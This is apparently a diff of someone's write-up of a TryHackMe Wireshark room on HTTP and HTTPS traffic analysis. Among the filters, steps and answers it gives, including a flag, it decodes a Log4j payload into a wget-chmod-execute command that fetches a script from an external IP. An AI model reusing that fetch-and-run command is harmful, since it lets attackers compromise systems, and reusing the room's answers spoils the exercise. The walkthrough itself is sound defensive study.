@@ -1088,7 +1088,7 @@ The adversary tried to assign special flags to change the executing permissions 
 
 ## _**7: Cleartext Protocol Analysis: HTTP**_
 
-HTTP Analysis   
+**HTTP Analysis**
 
 Hypertext Transfer Protocol (HTTP) is a cleartext-based, request-response and client-server protocol. It is the standard type of network activity to request/serve web pages, and by default, it is not blocked by any network perimeter. As a result of being unencrypted and the backbone of web traffic, HTTP is one of the must know protocols in traffic analysis. Following attacks could be detected with the help of HTTP analysis:
 
@@ -1148,9 +1148,95 @@ Locate the "Log4j" attack starting phase. What is the packet number?
 
 - `http contains jndi`
 - 444
+![](2023-02-23-07-51-09.png)
 
 Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
 
-- on frame 444 copy the User-Agent value to the clipboard and decode on cyberchef.org website
+- on frame 444 `right click User-Agent -> copy -> value` and decode on [cyberchef.org](https://cyberchef.org/) website after removing the unneeded parts of the value.
 - 62[.]210[.]130[.]250
+- can also be decrypted on the device by creating a file with the base64 string. 
+- `vi base64.txt` -> paste string `i` to insert `esc :wq` to save
+- `{d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}` -> added first and last characters for safety
+- `base64 -d base64.txt`
+- `wget http://62[.]210[.]130[.]250/lh.sh;chmod +x lh.sh;./lh.sh` -> I added the [defang] into this output for safety.
+  ![](2023-02-23-07-51-32.png)
+
+## _**8: Encrypted Protocol Analysis: Decrypting HTTPS**_
+
+**Decrypting HTTPS Traffic**
+
+When investigating web traffic, analysts often run across encrypted traffic. This is caused by using the Hypertext Transfer Protocol Secure (HTTPS) protocol for enhanced security against spoofing, sniffing and intercepting attacks. HTTPS uses TLS protocol to encrypt communications, so it is impossible to decrypt the traffic and view the transferred data without having the encryption/decryption key pairs. As this protocol provides a good level of security for transmitting sensitive data, attackers and malicious websites also use HTTPS. Therefore, a security analyst should know how to use key files to decrypt encrypted traffic and investigate the traffic activity.
+
+The packets will appear in different colours as the HTTP traffic is encrypted. Also, protocol and info details (actual URL address and data returned from the server) will not be fully visible. The first image below shows the HTTP packets encrypted with the TLS protocol. The second and third images demonstrate filtering HTTP packets without using a key log file.
+
+Additional information for HTTPS :  
+
+<table class="table table-bordered"><tbody><tr><td><span style="font-weight:bolder">Notes</span></td><td><span style="font-weight:bolder">Wireshark Filter</span></td></tr><tr><td><p style="text-align:left"><span style="font-size:1rem;font-weight:bolder">"HTTPS</span><span style="font-size:1rem"><span style="font-weight:bolder">&nbsp;Parameters"</span>&nbsp;for grabbing the low-hanging fruits:</span></p><ul><li style="text-align:left"><b style="font-size:1rem">Request: </b><span style="font-size:1rem">Listing all requests</span><br></li><li style="text-align:left"><b>TLS:</b> Global TLS search</li><li style="text-align:left">TLS Client Request</li><li style="text-align:left">TLS Server response</li><li style="text-align:left">Local Simple Service Discovery Protocol (SSDP)</li></ul><p style="text-align:left"><b>Note:</b>&nbsp;<span style="text-align:center;font-size:1rem">SSDP is a network protocol that provides advertisement and discovery of network services.</span></p></td><td><ul><li style="text-align:left"><code style="font-size:14px">http.request</code></li></ul><ul><li style="text-align:left"><code style="font-size:14px">tls</code></li></ul><ul><li style="text-align:left"><code style="font-size:14px">tls.handshake.type == 1</code></li></ul><ul><li style="text-align:left"><code style="font-size:14px">tls.handshake.type == 2</code></li></ul><ul><li style="text-align:left"><code style="font-size:14px">ssdp</code></li></ul></td></tr></tbody></table>
+
+![](2023-02-23-07-39-02.png)
+
+Similar to the TCP three-way handshake process, the TLS protocol has its handshake process. The first two steps contain "Client Hello" and "Server Hello" messages. The given filters show the initial hello packets in a capture file. These filters are helpful to spot which IP addresses are involved in the TLS handshake.  
+
+- Client Hello: `(http.request or tls.handshake.type == 1) and !(ssdp)` 
+- Server Hello: `(http.request or tls.handshake.type == 2) and !(ssdp)`
+
+![](2023-02-23-07-39-45.png)
+![](2023-02-23-07-40-03.png)
+
+An encryption key log file is a text file that contains unique key pairs to decrypt the encrypted traffic session. These key pairs are automatically created (per session) when a connection is established with an SSL/TLS-enabled webpage. As these processes are all accomplished in the browser, you need to configure your system and use a suitable browser (Chrome and Firefox support this) to save these values as a key log file. To do this, you will need to set up an environment variable and create the SSLKEYLOGFILE, and the browser will dump the keys to this file as you browse the web. SSL/TLS key pairs are created per session at the connection time, so it is important to dump the keys during the traffic capture. Otherwise, it is not possible to create/generate a suitable key log file to decrypt captured traffic. You can use the "right-click" menu or "Edit --> Preferences --> Protocols --> TLS" menu to add/remove key log files.
+
+Adding key log files with the "right-click" menu:
+
+![](2023-02-23-07-41-06.png)
+
+Adding key log files with the "Edit --> Preferences --> Protocols --> TLS" menu:
+
+![](2023-02-23-07-41-32.png)
+
+Viewing the traffic with/without the key log files:
+
+![](2023-02-23-07-42-21.png)
+![](2023-02-23-07-42-46.png)
+
+The above image shows that the traffic details are visible after using the key log file. Note that the packet details and bytes pane provides the data in different formats for investigation. Decompressed header info and HTTP2 packet details are available after decrypting the traffic. Depending on the packet details, you can also have the following data formats:
+
+- Frame
+- Decrypted TLS
+- Decompressed Header
+- Reassembled TCP
+- Reassembled SSL
+
+Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!
+
+**Questions**
+
+Use the "Desktop/exercise-pcaps/https/Exercise.pcap" file.
+
+What is the frame number of the "Client Hello" message sent to "accounts.google.com"?
+
+- `(http.request or tls.handshake.type == 1) and !(ssdp)`
+- `((http.request or tls.handshake.type == 1) and !(ssdp)) && (tls.handshake.extensions_server_name == "accounts.google.com")`
+- Looked in a frame to find a server name and then added that to the filter
+- 16
+- Hint from THM: "Protocol Details Pane --> TLS --> Handshake Protocol --> Extension: server_name" can help.
+![](2023-02-23-08-18-20.png)
+
+Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?
+
+- `http2`
+- 115
+
+Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)
+
+- safebrowsing[.]googleapis[.]com
+![](2023-02-23-08-21-26.png)
+
+Investigate the decrypted packets and find the flag! What is the flag?
+
+- remove previous filters
+- click search (magnifiying glass) -> Packet details -> Narrow (UTF-8/ASCII) -> String -> `flag{` -> find
+- FLAG{THM-PACKETMASTER}
+![](2023-02-23-08-34-30.png)
+
+## _**9: Bonus: Hunt Cleartext Credentials!**_
 
